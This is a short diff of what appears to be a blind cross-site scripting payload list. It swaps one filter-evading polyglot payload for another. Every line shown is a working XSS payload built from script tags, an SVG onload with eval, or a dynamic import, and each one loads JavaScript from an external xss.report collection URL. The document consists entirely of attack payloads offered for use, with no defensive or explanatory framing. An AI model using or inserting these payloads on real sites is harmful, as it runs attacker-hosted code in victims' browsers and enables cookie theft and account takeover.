@@ -1,3 +1,3 @@
 '"><script src=https://xss.report/c/hnterx?1></script>
-/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://xss.report/c/hnterx?49"></scrIpt>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\hnterx/.source))//>
 <svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/hnterx?102\';document.body.appendChild(a)')" />
